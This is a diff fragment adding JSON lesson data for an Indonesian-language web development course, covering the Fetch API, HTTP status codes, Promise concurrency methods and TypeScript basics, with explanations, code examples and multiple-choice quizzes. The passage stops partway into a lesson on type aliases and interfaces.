+              "Di dalam semua fungsi biasa tanpa syarat.",
+              "Hanya di dalam file CSS stylesheet.",
+              "Hanya di dalam tag <head> HTML."
+            ],
+            "correctIndex": 0,
+            "explanation": "await hanya sah digunakan di dalam async functions atau pada tingkat teratas modul ES (Top-Level Await)."
+          }
+        ]
+      },
+      {
+        "id": "lesson-10-4",
+        "stageId": "stage-10",
+        "slug": "fetch-api-dan-http-requests",
+        "title": "Fetch API, HTTP Methods & Status Codes",
+        "titleEn": "Fetch API & HTTP Communication",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 18,
+        "description": "Mengambil data dari REST API dengan window.fetch(), HTTP Methods (GET, POST, PUT, DELETE), headers (Content-Type: application/json), response.json(), dan HTTP status codes (200, 201, 400, 401, 404, 500).",
+        "prerequisites": [
+          "async-await-dan-try-catch-error-handling"
+        ],
+        "learningObjectives": [
+          "Mengeksekusi HTTP Request menggunakan window.fetch() modern.",
+          "Menerapkan HTTP Methods standar: GET (baca), POST (buat), PUT/PATCH (ubah), DELETE (hapus).",
+          "Memeriksa HTTP Status Code dan properti response.ok (menangani error 404 dan 500).",
+          "Mengirim payload data JSON dengan header 'Content-Type': 'application/json'."
+        ],
+        "whyMatters": "Fetch API adalah jembatan komunikasi utama yang menghubungkan tampilan frontend dengan server database backend melalui REST API.",
+        "careerContext": "Setiap aplikasi web modern berkomunikasi dengan REST API / GraphQL backend menggunakan Fetch API.",
+        "commonMistakes": [
+          "Lupa bahwa `fetch()` TIDAK me-reject Promise pada HTTP error status (seperti 404 Not Found atau 500 Server Error); Anda WAJIB memeriksa `if (!response.ok)` secara manual.",
+          "Lupa menyertakan `JSON.stringify(body)` dan header `'Content-Type': 'application/json'` saat mengirim data POST."
+        ],
+        "keyTerms": [
+          {
+            "term": "Fetch API",
+            "definition": "Antarmuka bawaan browser modern untuk melakukan HTTP network requests secara asinkron berbasis Promise."
+          },
+          {
+            "term": "HTTP Status Codes",
+            "definition": "Kode numerik 3 digit respon dari server (2xx Sukses, 4xx Client Error, 5xx Server Error)."
+          },
+          {
+            "term": "response.ok",
+            "definition": "Properti boolean yang bernilai true jika status HTTP berada di rentang sukses 200–299."
+          },
+          {
+            "term": "Payload / Body",
+            "definition": "Data data yang dikirimkan dalam permintaan POST/PUT (biasanya dalam format JSON string)."
+          }
+        ],
+        "contentMd": "# Fetch API, HTTP Methods & Status Codes\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari cara berkomunikasi dengan server backend menggunakan **`Fetch API`**, memahami **HTTP Methods** (**GET, POST, PUT, DELETE**), memeriksa **HTTP Status Codes**, serta mengirim payload data **JSON**.\n\n## Mengapa Konsep Ini Penting?\nAplikasi seperti Instagram, Netflix, dan BelajarinAja tidak menyimpan seluruh data film/kursus di dalam file HTML laptop pengguna. Frontend mengambil data segar secara dinamis dari server backend melalui Fetch API.\n\n## 1. Operasi Membaca Data: HTTP GET Request\n\n```javascript\nasync function ambilDaftarKursus() {\n  try {\n    const respon = await fetch(\"https://api.belajarinaja.com/v1/courses\");\n\n    // JEBAKAN PENTING: fetch TIDAK melempar error pada status 404 atau 500!\n    // Kita WAJIB memeriksa respon.ok secara manual:\n    if (!respon.ok) {\n      throw new Error(`Gagal memuat data! Status: ${respon.status}`);\n    }\n\n    // Ekstrak isi JSON:\n    const data = await respon.json();\n    console.log(\"Daftar Kursus:\", data);\n    return data;\n\n  } catch (error) {\n    console.error(\"Terjadi Masalah Jaringan:\", error.message);\n  }\n}\n```\n\n## 2. Operasi Mengirim Data: HTTP POST Request\n\n```javascript\nasync function buatPenggunaBaru(dataPengguna) {\n  try {\n    const respon = await fetch(\"https://api.belajarinaja.com/v1/users\", {\n      method: \"POST\", // 1. Tentukan Method\n      headers: {\n        // 2. Beritahu server bahwa kita mengirim format JSON\n        \"Content-Type\": \"application/json\"\n      },\n      // 3. Ubah Objek JS menjadi String JSON untuk dikirim melalui kabel jaringan\n      body: JSON.stringify(dataPengguna)\n    });\n\n    if (!respon.ok) {\n      throw new Error(\"Gagal membuat pengguna baru\");\n    }\n\n    const hasil = await respon.json();\n    console.log(\"Pengguna Berhasil Dibuat:\", hasil);\n\n  } catch (error) {\n    console.error(\"Gagal POST Data:\", error.message);\n  }\n}\n```\n\n## 3. Peta HTTP Status Codes yang Wajib Dihafal\n\n| Kelompok Status | Arti Umum | Contoh Kode Populer |\n| :--- | :--- | :--- |\n| **2xx (Success)** | Permintaan Berhasil | **200 OK** (Sukses Baca), **201 Created** (Sukses Bikin Data Baru) |\n| **3xx (Redirection)** | Halaman Pindah Alamat | **301 Moved Permanently**, **304 Not Modified** (Cache) |\n| **4xx (Client Error)** | Kesalahan di Sisi Pengguna | **400 Bad Request**, **401 Unauthorized** (Belum Login), **403 Forbidden** (Dilarang), **404 Not Found** (Tidak Ditemukan) |\n| **5xx (Server Error)** | Kesalahan di Sisi Server | **500 Internal Server Error** (Backend Crash), **502 Bad Gateway**, **503 Service Unavailable** |\n\n## Kesalahan Umum Pemula\n- **Lupa await respon.json()**: `respon.json()` adalah operasi asinkron yang juga mengembalikan Promise. Menulis `const data = respon.json()` tanpa `await` akan menghasilkan `Promise { <pending> }`.\n\n## Praktik Mandiri\n1. Gunakan API publik gratis `https://jsonplaceholder.typicode.com/todos/1`.\n2. Lakukan `fetch()` data tersebut, periksa `respon.ok`, dan cetak judul tugasnya ke console.\n\n## Ringkasan\n- Gunakan **`fetch(url, options)`** untuk melakukan panggilan HTTP asinkron.\n- Selalu periksa properti **`respon.ok`** untuk mendeteksi error status 4xx dan 5xx.\n- Saat melakukan POST/PUT, sertakan header **`'Content-Type': 'application/json'`** dan ubah data dengan **`JSON.stringify(body)`**.\n- Gunakan **`await respon.json()`** untuk mengurai data tubuh respon.",
+        "quizzes": [
+          {
+            "id": "q-10-4-1",
+            "question": "Mengapa kita wajib memeriksa properti if (!response.ok) secara manual saat menggunakan Fetch API?",
+            "options": [
+              "Karena fetch() TIDAK akan me-reject Promise jika server merespon dengan status error HTTP 404 (Not Found) atau 500 (Internal Server Error); fetch hanya reject jika terjadi kegagalan jaringan fisik total.",
+              "Karena response.ok menghapus virus dari komputer.",
+              "Karena browser mewajibkan pengecekan 10 kali.",
+              "Karena status 404 dianggap sukses oleh JavaScript."
+            ],
+            "correctIndex": 0,
+            "explanation": "Promise dari fetch() hanya melempar rejection jika koneksi jaringan terputus total; HTTP error seperti 404/500 tetap resolve dan harus dicek via response.ok."
+          },
+          {
+            "id": "q-10-4-2",
+            "question": "Ketika mengirimkan data objek JavaScript ke server backend menggunakan HTTP POST request, langkah apa yang wajib dilakukan pada opsi fetch?",
+            "options": [
+              "Menyetel method: 'POST', menambahkan header 'Content-Type': 'application/json', dan mengubah body dengan JSON.stringify(data).",
+              "Menghapus seluruh header request.",
+              "Mengirimkan file CSS.",
+              "Menyetel method: 'GET_POST'."
+            ],
+            "correctIndex": 0,
+            "explanation": "Server backend membutuhkan header Content-Type: application/json untuk mem-parsing payload JSON string yang dikirim di dalam request body."
+          },
+          {
+            "id": "q-10-4-3",
+            "question": "Berdasarkan standar protokol HTTP, kode status manakah yang menandakan bahwa pengguna belum terotentikasi (belum login / token tidak valid)?",
+            "options": [
+              "401 Unauthorized",
+              "200 OK",
+              "404 Not Found",
+              "500 Internal Server Error"
+            ],
+            "correctIndex": 0,
+            "explanation": "HTTP 401 Unauthorized secara eksplisit menandakan permintaan ditolak karena klien belum memiliki kredensial otentikasi yang sah."
+          }
+        ]
+      },
+      {
+        "id": "lesson-10-5",
+        "stageId": "stage-10",
+        "slug": "promise-concurrency-all-allsettled-race",
+        "title": "Promise Concurrency: all, allSettled, race & any",
+        "titleEn": "Promise Concurrency Methods",
+        "level": "ADVANCED",
+        "estimatedMinutes": 20,
+        "description": "Menjalankan banyak request asinkron secara paralel dengan Promise.all (fail-fast), Promise.allSettled (tahan kegagalan), Promise.race (kecepatan), dan Promise.any.",
+        "prerequisites": [
+          "fetch-api-dan-http-requests"
+        ],
+        "learningObjectives": [
+          "Menganalisis perbedaan performa antara mengeksekusi request sekuensial (lambat) vs paralel (kencang).",
+          "Menerapkan Promise.all() untuk eksekusi paralel fail-fast (semua harus sukses).",
+          "Menerapkan Promise.allSettled() untuk menangani daftar request independen tanpa gagal total jika satu request error.",
+          "Menerapkan Promise.race() untuk membuat sistem batas waktu (Timeout limit)."
+        ],
+        "whyMatters": "Menjalankan 5 API request secara sekuensial memakan waktu 5 detik ($1s \\times 5$), sedangkan paralel dengan Promise.all hanya memakan waktu 1 detik ($1s$ total) — meningkatkan kecepatan halaman hingga 500%!",
+        "careerContext": "Optimasi konkurensi paralel adalah kemampuan wajib senior frontend engineer dalam mempercepat Core Web Vitals dan respon dashboard.",
+        "commonMistakes": [
+          "Menulis `await` berulang kali di dalam for loop (eksekusi menjadi sekuensial lambat) alih-alih menggunakan `Promise.all`.",
+          "Menggunakan `Promise.all` untuk widget yang independen (jika 1 widget gagal, seluruh halaman ikut rusak)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Promise Concurrency",
+            "definition": "Mekanisme untuk mengelola dan mengeksekusi beberapa Promise secara paralel simultan."
+          },
+          {
+            "term": "Promise.all()",
+            "definition": "Menjalankan semua Promise secara paralel; berhasil jika SEMUA sukses, dan langsung gagal jika ada SATU saja yang rejected (Fail-Fast)."
+          },
+          {
+            "term": "Promise.allSettled()",
+            "definition": "Menunggu SELURUH Promise selesai tanpa memedulikan sukses/gagal, mengembalikan array status hasil setiap Promise."
+          },
+          {
+            "term": "Promise.race()",
+            "definition": "Mengembalikan hasil dari Promise pertama yang paling cepat selesai (settled), baik sukses maupun gagal."
+          }
+        ],
+        "contentMd": "# Promise Concurrency: all, allSettled, race & any\n\n## Apa yang Akan Dipelajari?\nPada materi tingkat lanjut ini, Anda akan mempelajari **Promise Concurrency**: cara menjalankan banyak permintaan jaringan secara paralel (**`Promise.all`**, **`Promise.allSettled`**, **`Promise.race`**, **`Promise.any`**) untuk mempercepat waktu pemuatan aplikasi hingga berkali-kali lipat.\n\n## Mengapa Konsep Ini Penting?\nBayangkan dashboard Anda membutuhkan 3 data: Profil Pengguna (butuh 1 detik), Daftar Notifikasi (butuh 1 detik), dan Statistik Penjualan (butuh 1 detik).\n\n- **Cara Sekuensial (Lambat - 3 Detik Total)**:\n```javascript\nconst user = await fetchUser(); // Tunggu 1s\nconst notif = await fetchNotif(); // Tunggu 1s lagi\nconst stats = await fetchStats(); // Tunggu 1s lagi\n// Total waktu tunggu pengguna = 3 DETIK!\n```\n\n- **Cara Paralel dengan Concurrency (Kencang - HANYA 1 Detik Total!)**:\nSemua request ditembakkan bersamaan ke server secara simultan!\n\n## 1. Empat Metode Promise Concurrency\n\n### A. `Promise.all()` (Semua Wajib Sukses / Fail-Fast)\nMenjalankan semua Promise paralel dan mengembalikan array hasil jika **SEMUANYA SUKSES**. Jika ada **SATU SAJA yang gagal**, seluruh `Promise.all` langsung memicu reject:\n\n```javascript\ntry {\n  const [user, notif, stats] = await Promise.all([\n    fetchUser(),\n    fetchNotif(),\n    fetchStats()\n  ]);\n  console.log(\"Semua data sukses dimuat paralel dalam 1 detik!\");\n} catch (error) {\n  console.error(\"Salah satu data gagal dimuat:\", error);\n}\n```\n\n### B. `Promise.allSettled()` (Tahan Banting & Tidak Boleh Gagal Total)\nSangat ideal untuk widget independen. Ia menunggu semua Promise tuntas dan memberikan laporan status setiap item:\n\n```javascript\nconst hasilLengkap = await Promise.allSettled([\n  fetchCuaca(),\n  fetchBerita(),\n  fetchKursMataUang()\n]);\n\nhasilLengkap.forEach((hasil, index) => {\n  if (hasil.status === \"fulfilled\") {\n    console.log(`Widget ${index} Sukses:`, hasil.value);\n  } else {\n    console.warn(`Widget ${index} Gagal:`, hasil.reason);\n  }\n});\n```\n\n### C. `Promise.race()` (Balapan Kecepatan / Timeout Guard)\nMengembalikan Promise mana yang **paling cepat selesai** pertama kali:\n\n```javascript\n// Pola Timeout Request: Batalkan jika server tidak merespon dalam 5 detik\nconst timeoutPromise = new Promise((_, reject) => \n  setTimeout(() => reject(new Error(\"Request Timeout!\")), 5000)\n);\n\ntry {\n  const data = await Promise.race([fetchDataPenting(), timeoutPromise]);\n  console.log(\"Data berhasil diambil sebelum batas 5 detik:\", data);\n} catch (err) {\n  console.error(err.message); // Menangkap jika timeout menang balapan\n}\n```\n\n## Kesalahan Umum Pemula\n- **Memakai Promise.all untuk data yang tidak saling bergantung**: Jika widget banner diskon opsional gagal di `Promise.all`, halaman utama profil pengguna ikut tidak bisa dibuka. Gunakan `Promise.allSettled` untuk data yang terisolasi.\n\n## Praktik Mandiri\n1. Buat dua Promise dengan delay `setTimeout` 1000ms dan 2000ms.\n2. Gabungkan dengan `Promise.all` dan ukur bahwa total waktu penyelesaian hanya memakan waktu 2 detik (bukan 3 detik).\n\n## Ringkasan\n- Eksekusi paralel memangkas waktu tunggu secara drastis dibanding eksekusi sekuensial.\n- **`Promise.all`** unggul saat semua data wajib ada (gagal jika salah satu error).\n- **`Promise.allSettled`** unggul saat komponen-komponen independen tidak boleh saling menggagalkan.\n- **`Promise.race`** mengambil hasil tercepat pertama (sempurna untuk proteksi timeout request).",
+        "quizzes": [
+          {
+            "id": "q-10-5-1",
+            "question": "Apa keuntungan performa utama dari mengeksekusi 3 panggilan API independen menggunakan Promise.all() dibandingkan melakukan await satu per satu secara sekuensial?",
+            "options": [
+              "Ketiga panggilan API berjalan secara paralel simultan di jaringan, sehingga total waktu tunggu hanya sepanjang request yang paling lama, bukan akumulasi penjumlahan ketiganya.",
+              "Promise.all membuat server backend memprioritaskan akun kita.",
+              "Promise.all menghapus batasan kuota API.",
+              "Promise.all mengubah format data otomatis menjadi CSV."
+            ],
+            "correctIndex": 0,
+            "explanation": "Eksekusi paralel menembakkan seluruh request bersamaan ke network pool sehingga durasi total sama dengan durasi request terpanjang (misal 1s vs 3s)."
+          },
+          {
+            "id": "q-10-5-2",
+            "question": "Kapan Anda sebaiknya memilih Promise.allSettled() dibandingkan Promise.all()?",
+            "options": [
+              "Ketika ingin memuat beberapa widget independen di mana kegagalan salah satu widget tidak boleh menggagalkan penampilan widget lainnya yang berhasil.",
+              "Ketika ingin memastikan seluruh request harus sukses tanpa terkecuali.",
+              "Ketika tidak memiliki koneksi internet.",
+              "Hanya saat mengirimkan data formulir login."
+            ],
+            "correctIndex": 0,
+            "explanation": "Promise.allSettled tidak membatalkan eksekusi jika ada satu Promise yang rejected, memberikan status detail status fulfilled/rejected per item."
+          },
+          {
+            "id": "q-10-5-3",
+            "question": "Pola implementasi praktis apakah yang paling umum memanfaatkan metode Promise.race()?",
+            "options": [
+              "Membuat batas waktu maksimal (Request Timeout): membalapkan request jaringan dengan timer Promise yang me-reject jika batas waktu terlewati.",
+              "Menyimpan password ke dalam localStorage.",
+              "Mengurutkan array angka dari terkecil ke terbesar.",
+              "Mengubah warna tema aplikasi secara acak."
+            ],
+            "correctIndex": 0,
+            "explanation": "Promise.race mengembalikan Promise pertama yang settled, menjadikannya pola standar untuk membatalkan request jaringan yang lambat via timeout."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "stage-11",
+    "orderIndex": 11,
+    "titleId": "TypeScript Fundamentals & Type Safety",
+    "titleEn": "TypeScript Fundamentals & Type Safety",
+    "category": "Frontend",
+    "description": "Menguasai pengetikan statis (Static Typing), Primitive Types, Type Inference vs Annotations, Interface vs Type Alias, Generics, dan Narrowing.",
+    "descriptionEn": "Master static typing, primitive types, inference vs annotations, interface vs type alias, generics, and narrowing in TypeScript.",
+    "lessons": [
+      {
+        "id": "lesson-11-1",
+        "stageId": "stage-11",
+        "slug": "mengapa-typescript-dan-pengaturan-awal",
+        "title": "Mengapa TypeScript? Static Typing vs Dynamic Typing",
+        "titleEn": "Why TypeScript? Static vs Dynamic Typing",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Memahami mengapa industri bermigrasi ke TypeScript: menangkap bug pada saat kompilasi (Compile-Time), dokumentasi swadaya (IntelliSense), dan konfigurasi tsconfig.json.",
+        "prerequisites": [
+          "promise-concurrency-all-allsettled-race"
+        ],
+        "learningObjectives": [
+          "Membedakan antara Static Typing (TypeScript) dan Dynamic Typing (JavaScript murni).",
+          "Menjelaskan keuntungan menangkap error pada Compile-Time dibandingkan saat aplikasi sudah berjalan di tangan pengguna (Runtime).",
+          "Memahami opsi konfigurasi penting dalam tsconfig.json (target, strict, moduleResolution)."
+        ],
+        "whyMatters": "TypeScript mengeliminasi kelas bug paling umum di web: `TypeError: undefined is not a function` sebelum kode sempat dijalankan.",
+        "careerContext": "TypeScript adalah bahasa wajib standar di Next.js dan seluruh lowongan kerja Fullstack modern.",
+        "commonMistakes": [
+          "Mematikan fitur keamanan TypeScript dengan menyetel mode `noImplicitAny: false` atau menggunakan tipe `any` di mana-mana.",
+          "Mengira TypeScript dijalankan langsung oleh browser (TypeScript selalu di-transpile menjadi JavaScript murni sebelum dieksekusi browser)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Static Typing",
+            "definition": "Pemeriksaan tipe data variabel yang dilakukan pada saat kode ditulis dan dikompilasi (Compile-Time)."
+          },
+          {
+            "term": "Type Safety",
+            "definition": "Jaminan bahwa program tidak akan melakukan operasi ilegal pada tipe data yang tidak sesuai."
+          },
+          {
+            "term": "tsconfig.json",
+            "definition": "File konfigurasi utama compiler TypeScript (tsc)."
+          }
+        ],
+        "contentMd": "# Mengapa TypeScript? Static Typing vs Dynamic Typing\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari alasan mengapa industri software global beralih ke **TypeScript**: perbedaan antara **Static Typing** vs **Dynamic Typing**, bagaimana TypeScript menangkap bug pada saat penulisan kode (**Compile-Time**), serta konfigurasi **`tsconfig.json`**.\n\n## Mengapa Konsep Ini Penting?\nDi JavaScript murni, jika Anda salah mengetik nama properti `user.emial` alih-alih `user.email`, JavaScript tidak akan memberi peringatan apa pun hingga kode tersebut dijalankan oleh pengguna di server dan menyebabkan sistem crash. TypeScript bertindak sebagai asisten pemeriksa kesalahan instan yang mencegah hal itu terjadi.\n\n## 1. Static Typing vs Dynamic Typing\n\n```text\nJAVASCRIPT MURNI (Dynamic Typing)\n[ Tulis Kode ] ──> [ Eksekusi di Browser User ] ──> 💥 RUNTIME ERROR!\n\nTYPESCRIPT (Static Typing)\n[ Tulis Kode ] ──> [ Compiler tsc Periksa ] ──> 🛡️ TERTANGKAP SAAT KODING (Compile-Time Safe!)\n```\n\n- **JavaScript (Dynamic)**: Tipe data terikat pada nilai, bukan variabel. Tipe baru diketahui saat kode dieksekusi di browser pengguna (*Runtime*).\n- **TypeScript (Static)**: Tipe data didefinisikan secara eksplisit saat menulis kode. Kesalahan ketik, argumen kurang, atau salah tipe langsung diberi garis bawah merah saat itu juga (*Compile-Time*).\n\n## 2. Fitur Unggulan TypeScript bagi Developer\n1. **IntelliSense & Autocomplete Instan**: Saat Anda mengetik `user.`, editor VS Code langsung menampilkan daftar seluruh properti dan tipe datanya tanpa perlu menebak-nebak.\n2. **Refactoring Percaya Diri**: Mengubah nama properti di satu tempat otomatis memperbarui seluruh file proyek dengan aman.\n3. **Dokumentasi Hidup**: Tipe data bertindak sebagai kontrak spesifikasi yang selalu akurat dan tidak pernah usang.\n\n## 3. Konfigurasi Standar: `tsconfig.json`\nFile `tsconfig.json` mengatur seberapa ketat compiler TypeScript bekerja:\n\n```json\n{\n  \"compilerOptions\": {\n    \"target\": \"ES2022\",\n    \"module\": \"ESNext\",\n    \"moduleResolution\": \"bundler\",\n    \"strict\": true,            /* WAJIB: Mengaktifkan seluruh aturan keamanan ketat */\n    \"noUncheckedIndexedAccess\": true,\n    \"jsx\": \"preserve\"\n  }\n}\n```\n\n## Kesalahan Umum Pemula\n- **Menganggap TypeScript berjalan di browser**: Browser hanya mengerti JavaScript. Compiler TypeScript (`tsc`) bertugas menghapus seluruh anotasi tipe dan menghasilkan file `.js` bersih untuk dijalankan browser.\n\n## Praktik Mandiri\n1. Buat fungsi sederhana di TypeScript: `function hitungPajak(harga: number): number { return harga * 0.11; }`.\n2. Coba panggil dengan string `hitungPajak(\"1000\")` dan perhatikan bagaimana compiler TypeScript langsung menolak kode tersebut.\n\n## Ringkasan\n- **TypeScript** menambahkan sistem **Static Typing** dan **Type Safety** di atas JavaScript.\n- TypeScript menangkap bug pada saat penulisan kode (**Compile-Time**), bukan saat aplikasi berjalan di pengguna (**Runtime**).\n- Selalu aktifkan **`\"strict\": true`** di dalam `tsconfig.json` untuk proteksi maksimal.",
+        "quizzes": [
+          {
+            "id": "q-11-1-1",
+            "question": "Kapan sistem pemeriksaan tipe data pada TypeScript menangkap kesalahan tipe (type error) atau kesalahan ketik nama properti?",
+            "options": [
+              "Pada saat penulisan kode dan kompilasi (Compile-Time), sebelum kode sempat dijalankan di browser.",
+              "Hanya saat website diakses oleh 1000 pengguna sekaligus.",
+              "Setelah file diunggah ke server hosting.",
+              "Hanya ketika browser mengalami crash."
+            ],
+            "correctIndex": 0,
+            "explanation": "Keunggulan utama static typing adalah deteksi dini kesalahan pada fase compile-time di editor IDE sebelum kode dirilis ke lingkungan runtime."
+          },
+          {
+            "id": "q-11-1-2",
+            "question": "Apa yang terjadi pada seluruh anotasi tipe TypeScript saat kode dikompilasi menjadi berkas produksi untuk browser?",
+            "options": [
+              "Seluruh anotasi tipe dihapus (stripped away) menghasilkan berkas JavaScript murni standar yang dapat dieksekusi oleh browser.",
+              "Tipe dienkripsi menjadi password di dalam browser.",
+              "Anotasi tipe diubah menjadi baris komentar HTML.",
+              "Browser mengeksekusi file .ts secara langsung tanpa kompilasi."
+            ],
+            "correctIndex": 0,
+            "explanation": "TypeScript adalah alat development time; compiler mentranspilasikan TypeScript menjadi JavaScript murni yang kompatibel dengan seluruh browser."
+          },
+          {
+            "id": "q-11-1-3",
+            "question": "Opsi compiler manakah di dalam file tsconfig.json yang WAJIB diaktifkan untuk memastikan seluruh aturan keamanan pengetikan ketat berlaku?",
+            "options": [
+              "\"strict\": true",
+              "\"fastMode\": true",
+              "\"ignoreErrors\": true",
+              "\"loose\": true"
+            ],
+            "correctIndex": 0,
+            "explanation": "strict: true mengaktifkan seluruh rangkaian pemeriksaan tipe kuat (termasuk noImplicitAny, strictNullChecks) demi keamanan kode tingkat produksi."
+          }
+        ]
+      },
+      {
+        "id": "lesson-11-2",
+        "stageId": "stage-11",
+        "slug": "tipe-primitif-dan-type-inference",
+        "title": "Tipe Primitif & Type Inference",
+        "titleEn": "Primitive Types & Type Inference",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Menulis type annotations eksplisit (string, number, boolean, array, tuple), memahami inferensi otomatis compiler, dan bahaya tipe any vs unknown.",
+        "prerequisites": [
+          "mengapa-typescript-dan-pengaturan-awal"
+        ],
+        "learningObjectives": [
+          "Menerapkan Type Annotations pada variabel dan parameter fungsi.",
+          "Menjelaskan cara kerja Type Inference otomatis pada inisialisasi variabel.",
+          "Mendefinisikan tipe Array `number[]` dan Tuple berukuran tetap `[string, number]`.",
+          "Membedakan tipe `any` (mematikan proteksi tipe) vs `unknown` (tipe aman yang wajib di-narrowing)."
+        ],
+        "whyMatters": "Memahami Type Inference menghemat waktu Anda dari menulis anotasi tipe berlebihan (*redundant code*) yang tidak perlu.",
+        "careerContext": "Developer senior menulis kode TypeScript yang bersih dengan membiarkan TypeScript meng-infer tipe secara alami jika sudah jelas.",
+        "commonMistakes": [
+          "Menulis anotasi redundan seperti `const nama: string = 'Acelino'` (cukup tulis `const nama = 'Acelino'`).",
+          "Menggunakan `any` saat tidak tahu tipe data (gunakan `unknown` yang jauh lebih aman)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Type Annotation",
+            "definition": "Sintaks eksplisit `: Tipe` untuk menentukan tipe data variabel atau fungsi."
+          },
+          {
+            "term": "Type Inference",
+            "definition": "Kemampuan compiler menebak dan menetapkan tipe data secara otomatis berdasarkan nilai awal yang diisikan."
+          },
+          {
+            "term": "any",
+            "definition": "Tipe pelarian yang mematikan seluruh pemeriksaan tipe TypeScript (sangat dihindari)."
+          },
+          {
+            "term": "unknown",
+            "definition": "Tipe aman yang mewakili nilai apapun tetapi mewajibkan pemeriksaan tipe sebelum dapat digunakan."
+          }
+        ],
+        "contentMd": "# Tipe Primitif & Type Inference\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari cara memberikan tipe pada data primitif (**`string`**, **`number`**, **`boolean`**), tipe **Array** dan **Tuple**, bagaimana compiler melakukan **Type Inference**, serta perbedaan kritis antara **`any`** vs **`unknown`**.\n\n## Mengapa Konsep Ini Penting?\nAnda tidak perlu mengetik anotasi tipe di setiap baris variabel secara manual. Mengetahui kapan harus menulis anotasi eksplisit dan kapan membiarkan TypeScript menebak (*infer*) tipe secara otomatis membuat kode Anda tetap ringkas dan aman.\n\n## 1. Type Annotations Eksplisit vs Type Inference\n- **Type Annotation**: Menuliskan tipe secara sengaja dengan titik dua (`: Tipe`).\n- **Type Inference**: TypeScript otomatis menebak tipenya jika nilai awal langsung diberikan.\n\n```typescript\n// CONTOH INFERENCE (TypeScript otomatis tahu tipenya string):\nlet nama = \"Acelino\"; \n// nama = 123; // ERROR: Type 'number' is not assignable to type 'string'\n\n// CONTOH KAPAN ANNOTATION DIBUTUHKAN (Variabel belum diisi nilai awal):\nlet skor: number;\nskor = 100; // VALID\n\n// PADA PARAMETER FUNGSI (WAJIB ANNOTATION):\nfunction hitungTotal(harga: number, kuantitas: number): number {\n  return harga * kuantitas;\n}\n```\n\n## 2. Tipe Koleksi: Array dan Tuple\n\n```typescript\n// 1. Array Homogen (Semua elemen bertipe sama)\nconst daftarHarga: number[] = [10000, 25000, 50000];\nconst daftarSkill: Array<string> = [\"React\", \"TypeScript\"];\n\n// 2. Tuple (Array dengan jumlah elemen dan urutan tipe yang TETAP)\n// Contoh: Koordinat Geografis [Latitude, Longitude]\nconst koordinat: [number, number] = [-6.2088, 106.8456];\n\n// Contoh: Response State [Nilai, FungsiSetter] (Mirip useState di React)\nconst statusLogin: [boolean, string] = [true, \"admin@belajarinaja.com\"];\n```\n\n## 3. Bahaya `any` vs Keamanan `unknown`\n- **`any` (HINDARI!)**: Mematikan seluruh perlindungan TypeScript. Menulis `any` sama saja seperti kembali ke JavaScript murni yang rawan bug.\n- **`unknown` (AMAN)**: Mengindikasikan bahwa tipe data belum diketahui (misal respon dari library pihak ketiga), namun Anda **WAJIB** memeriksa tipenya sebelum memanipulasinya:\n\n```typescript\nlet dataMentah: unknown = \"Halo Dunia\";\n\n// dataMentah.toUpperCase(); // ERROR: Object is of type 'unknown'!\n\n// WAJIB DIPERIKSA TERLEBIH DAHULU (Type Narrowing):\nif (typeof dataMentah === \"string\") {\n  console.log(dataMentah.toUpperCase()); // AMAN & VALID!\n}\n```\n\n## Kesalahan Umum Pemula\n- **Memakai any sebagai jalan pintas saat malas**: Kebiasaan ini merusak integritas codebase proyek jangka panjang.\n\n## Praktik Mandiri\n1. Buat tipe Tuple untuk data profil: `[string, number, boolean]` (nama, usia, status aktif).\n2. Isi variabel dengan data yang sesuai.\n\n## Ringkasan\n- Manfaatkan **Type Inference** pada inisialisasi variabel sederhana.\n- Selalu berikan anotasi tipe pada **parameter fungsi**.\n- Gunakan **`T[]`** untuk array dan **`[T1, T2]`** untuk tuple dengan panjang dan tipe tetap.\n- Hindari **`any`** dan gunakan **`unknown`** dengan pengecekan `typeof`.",
+        "quizzes": [
+          {
+            "id": "q-11-2-1",
+            "question": "Apa yang dimaksud dengan kemampuan 'Type Inference' pada compiler TypeScript?",
+            "options": [
+              "Kemampuan compiler TypeScript untuk secara otomatis menyimpulkan dan menetapkan tipe data suatu variabel berdasarkan nilai awal yang diisikan tanpa perlu anotasi manual.",
+              "Kemampuan mengunduh file library otomatis.",
+              "Kemampuan menerjemahkan bahasa Inggris ke Indonesia.",
+              "Kemampuan menghapus variabel yang tidak terpakai."
+            ],
+            "correctIndex": 0,
+            "explanation": "Type inference menganalisis inisialisasi nilai awal (misal let x = 'halo') dan menetapkan x sebagai string secara otomatis."
+          },
+          {
+            "id": "q-11-2-2",
+            "question": "Apa perbedaan sifat keamanan antara tipe any dan tipe unknown di TypeScript?",
+            "options": [
+              "any mematikan seluruh pemeriksaan tipe (tidak aman), sedangkan unknown mewajibkan developer melakukan pemeriksaan tipe (type check) sebelum nilai tersebut boleh digunakan.",
+              "unknown mematikan keamanan sedangkan any sangat ketat.",
+              "Keduanya persis sama tanpa perbedaan.",
+              "unknown hanya bisa bernilai angka 0."
+            ],
+            "correctIndex": 0,
+            "explanation": "unknown adalah padanan type-safe dari any; compiler menolak pemanggilan properti/method pada tipe unknown sebelum tipenya dibuktikan via narrowing."
+          },
+          {
+            "id": "q-11-2-3",
+            "question": "Tipe data koleksi apakah di TypeScript yang mendefinisikan array dengan jumlah elemen tertentu dan urutan tipe data yang spesifik (contoh: [string, number])?",
+            "options": [
+              "Tuple",
+              "Dynamic List",
+              "Enum Array",
+              "Vector Matrix"
+            ],
+            "correctIndex": 0,
+            "explanation": "Tuple adalah struktur array berukuran tetap di mana setiap posisi indeks memiliki tipe data yang telah ditentukan secara terurut."
+          }
+        ]
+      },
+      {
+        "id": "lesson-11-3",
+        "stageId": "stage-11",
+        "slug": "type-aliases-dan-interfaces",
+        "title": "Type Aliases vs Interfaces (extends, union, intersection)",
+        "titleEn": "Type Aliases vs Interfaces",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 18,
+        "description": "Mendefinisikan kontrak bentuk objek dengan Interface (extends, declaration merging) vs Type Alias (union |, intersection &, primitive alias).",
+        "prerequisites": [
+          "tipe-primitif-dan-type-inference"
+        ],
+        "learningObjectives": [
